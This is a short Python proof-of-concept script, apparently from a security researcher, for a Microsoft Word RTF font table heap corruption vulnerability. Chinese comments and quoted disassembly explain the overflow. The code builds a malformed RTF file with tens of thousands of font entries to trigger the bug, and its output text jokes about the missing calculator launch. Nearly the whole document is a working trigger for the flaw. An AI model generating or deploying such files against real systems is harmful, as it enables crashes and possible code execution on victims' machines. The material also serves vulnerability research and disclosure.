#!/usr/bin/python
#
# PoC for:
# Microsoft Word RTF Font Table Heap Corruption Vulnerability
#
# by Joshua J. Drake (@jduck)
#
# Vul info：
# 堆溢出漏洞产生点在于：Microsoft Word中的RTF解析器在处理字体表(*\fonttbl*)包含过量字体(*\f###*)。当处理字体时，字体id值(a *\f*后面的字符)由以下代码处理:
# {% highlight asm %} 0d6cf0b6 0fbf0e movsx ecx,word ptr [esi] ; 
# load base idx 0d6cf0b9 0fbf5602 movsx edx,word ptr [esi+2] ; 
# load font idx 0d6cf0bd 8d1451 lea edx,[ecx+edx2] ; 
# multiply by ~3 0d6cf0c0 668b08 mov cx,word ptr [eax] ; 
# load the codepage value 0d6cf0c3 66894c5604 mov word ptr [esi+edx2+4],cx ; 
# write the code page {% endhighlight %}

import sys

# allow overriding the number of fonts
num = 32761
if len(sys.argv) > 1:
  num = int(sys.argv[1])

f = open("tezt.rtf", "wb")
f.write("{\\rtf1{\n{\\fonttbl")
for i in range(num):
  f.write("{\\f%dA;}\n" % i)
f.write("}\n")
f.write("{\\rtlch it didn't crash?? no calc?! BOO!!!}\n")
f.write("}}\n")
f.close()